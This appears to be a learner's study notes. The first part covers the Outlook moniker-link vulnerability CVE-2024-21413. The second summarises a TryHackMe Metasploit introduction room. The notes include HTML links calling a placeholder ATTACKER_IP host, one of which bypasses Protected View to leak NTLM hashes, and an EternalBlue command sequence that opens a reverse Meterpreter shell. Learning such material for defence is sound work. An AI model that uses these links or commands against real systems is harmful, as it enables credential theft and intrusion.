# Exploitation Basics

## Moniker
A **moniker** in Windows is a COM (Component Object Model) object reference that allows applications to dynamically locate and bind to other objects.  
- Acts like a pointer or "name" for COM objects.  
- Used in technologies such as **OLE (Object Linking and Embedding)**, **ActiveX**, and scripting environments.  
- Attackers can abuse monikers to execute arbitrary code when a document (e.g., a Word file) is opened.

---

## Link
Links in documents (like **OLE objects** or **embedded hyperlinks**) can be exploited:  
- Malicious documents may include links that, when clicked, automatically execute commands.  
- Outlook can render emails as HTML and parse links such as `http://` and `https://`.  
- It can also handle `file://` **Moniker Links**, which can point to files or resources on remote systems.  
- Normally, Outlook’s **Protected View** prompts users before opening external applications, blocking malicious actions.  

**Example of a basic Moniker Link:**
```html
<a href="file://ATTACKER_IP/test">Click me</a>
```

By modifying the link to include the `!` character, attackers can bypass Outlook’s Protected View:
```html
<a href="file://ATTACKER_IP/test!exploit">Click me</a>
```
Even if the share does not exist, Outlook will attempt an SMB authentication, leaking the victim’s **Windows NetNTLMv2 hash**.

---

## CVE-2024-21413 (Moniker Link)
- **Discovered by:** Haifei Li, Check Point Research  
- **Announced:** February 13th, 2024  
- **Type:** Remote Code Execution (RCE) & NTLM Credential Leak  

### Description
This vulnerability allows attackers to bypass Outlook’s security mechanisms when handling **Moniker Links**.  
When exploited, Outlook may send NTLM credentials to an attacker-controlled server, even if the malicious link is clicked in **Protected View**.

### Impact
- Theft of **NTLM hashes** and user credentials.  
- Potential for **remote code execution** due to COM object abuse.  
- Increased risk of **phishing and lateral movement** in corporate environments.  

### Proof of Concept (PoC) Overview
> **Note:** This is a high-level summary of the PoC; not executable instructions.

- Attacker crafts an email with a malicious Moniker Link.  
- Victim opens or previews the email in Outlook.  
- Outlook attempts to load a file via `file://` using SMB.  
- This triggers an **authentication attempt**, leaking the victim’s **NetNTLMv2 hash**.  
- An attacker could capture and attempt to crack these hashes with tools like *Responder* or *Impacket*.  

---

## Remediation
Microsoft released official patches for this vulnerability in **February 2024 Patch Tuesday**.  
Recommended actions:
- Apply the latest **Microsoft security updates** via Windows Update or the [Microsoft Update Catalog](https://www.catalog.update.microsoft.com/).  
- Disable automatic link preview in Outlook where possible.  
- Block outbound **SMB traffic** at the firewall, if feasible.  
- Educate users not to click unknown or suspicious links in emails.  
- Encourage reporting of suspicious emails to the security team.  

---

## References
- [Microsoft Security Response – CVE-2024-21413](https://msrc.microsoft.com/)  
- [Check Point Research – Haifei Li’s Discovery](https://research.checkpoint.com/)

# TryHackMe: Metasploit Introduction

**Completion Date:** September 11, 2025  
**Platform:** [TryHackMe](https://tryhackme.com/)  
**Room:** Metasploit: Introduction  

---

## Overview
Metasploit is the most widely used exploitation framework. It is a powerful tool that can support all phases of a penetration testing engagement, from information gathering to post-exploitation.

---

## Versions
- **Metasploit Pro**: Commercial version with a GUI, focused on automation and management.  
- **Metasploit Framework**: Open-source command-line version. Most commonly used in penetration testing distributions.

---

## Components of Metasploit
- **msfconsole** – the main CLI interface  
- **Modules** – includes exploits, scanners, payloads, etc.  
- **Tools** – e.g., `msfvenom`, `pattern_create`, `pattern_offset`  

### Module Types
- **Auxiliary** – scanners, crawlers, fuzzers  
- **Encoders** – obfuscate payloads to bypass AV  
- **Evasion** – modules to evade antivirus  
- **Exploits** – organized by OS and application type  
- **NOPs** – No Operation instructions, used for buffer consistency  
- **Payloads** – code executed on target systems (singles, stagers, stages, adapters)  
- **Post** – post-exploitation modules

---

## Key Concepts
- **Exploit**: Code leveraging a vulnerability  
- **Vulnerability**: Weakness in design, code, or logic  
- **Payload**: Malicious code executed on the target (e.g., reverse shells, Meterpreter)

---

## msfconsole
- Start with `msfconsole`  
- Context-sensitive: parameters reset unless set globally  
- Key commands:  
  - `use <module>` – load module  
  - `show options` – list module parameters  
  - `set/unset` – set or clear options  
  - `setg/unsetg` – set/unset global options  
  - `info` – detailed module information  
  - `search <term>` – search modules  
  - `exploit` or `run` – execute module  
  - `back` – exit module context  
  - `sessions` – manage active sessions  
  - `sessions -i <id>` – interact with session  

---

## Example Exploit: EternalBlue (MS17-010)
- **Exploit Path:** `exploit/windows/smb/ms17_010_eternalblue`  
- Steps:  
  1. `use exploit/windows/smb/ms17_010_eternalblue`  
  2. `set RHOSTS <target-ip>`  
  3. `set PAYLOAD windows/x64/meterpreter/reverse_tcp`  
  4. `set LHOST <your-ip>`  
  5. `exploit`  

Result: Spawns a Meterpreter session on the target.

---

## Sessions
- **Background session**: `background` or `CTRL+Z`  
- **List sessions**: `sessions`  
- **Interact with session**: `sessions -i <id>`  

---

## Summary
Metasploit simplifies the exploitation process into three steps:  
1. Find an exploit  
2. Configure/customize exploit  
3. Launch and gain access  

It provides a comprehensive toolkit for penetration testers and researchers, from scanning to post-exploitation.  

---
